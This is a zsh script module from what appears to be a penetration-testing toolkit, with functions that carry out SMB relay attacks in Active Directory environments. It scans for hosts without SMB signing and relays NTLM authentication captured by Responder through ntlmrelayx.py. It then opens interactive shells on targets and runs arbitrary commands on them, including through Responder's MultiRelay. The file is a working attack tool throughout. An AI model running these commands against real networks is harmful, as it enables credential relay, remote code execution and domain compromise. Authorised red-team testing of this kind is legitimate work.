#!/usr/bin/env zsh

############################################################# 
# nb-ad-smb-relay
#############################################################
nb-ad-smb-relay-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-smb-relay
---------------
The nb-ad-smb-relay namespace contains commands for SMB Relay attack in AD environment.

Commands
--------
nb-ad-smb-relay-install              installs dependencies
nb-ad-smb-relay-enum                 identify hosts without smb signing
nb-ad-smb-relay-ntlmrelay            relay the captured SMB requests by responder
nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using ntlmrelayx.py
nb-ad-smb-relay-multirelay-command   responder's alternative to ntlmrelayx.py - execute a shell command on a target host


DOC
}

nb-ad-smb-relay-install() {
  __info "Running $0..."
  __pkgs nmap impacket
}

nb-ad-smb-relay-enum() {
    __check-project
  	nb-vars-set-network

    print -z "sudo grc nmap -v --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netpath)/nmap-smb-security"
}

nb-ad-smb-relay-ntlmrelay() {
    __check-project

    __ask "Did you disable SMB in /etc/responder/Responder.conf? (y/n)"
	  local sm && __askvar sm SMB_OPTION
    if [[ $sm == "n" ]]; then
      __err "First disable SMB in /etc/responder/Responder.conf."
      __info "sudo nvim /etc/responder/Responder.conf"
      exit 1
    fi

    __ask "Did you first run responder? (y/n)"
	  local rp && __askvar rp RESPONDER

    if [[ $rp == "n" ]]; then
      __err "Run first responder to relay the smb request"
      __info "nb-ad-smb-responder"
      exit 1
    fi

	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS

    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(__netpath)/ntlmrelayx.txt"
}

nb-ad-smb-relay-ntlmrelay-shell() {
    __check-project
	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS

    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(__netpath)/ntlmrelayx-shell.txt"
}

nb-ad-smb-relay-ntlmrelay-command() {
    __check-project
	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS
	  local cm && __askvar cm COMMAND

	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c '$cm' | tee $(__netpath)/ntlmrelayx-command.txt"
}

nb-ad-smb-relay-multirelay-command() {
    __check-project
	  __ask "Enter the IP address of the target DC server"
	  nb-vars-set-rhost
	  __ask "Enter a shell command to execute"
	  local command && __askvar command COMMAND

	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(__netpath)/responder-multirelay.txt"
}
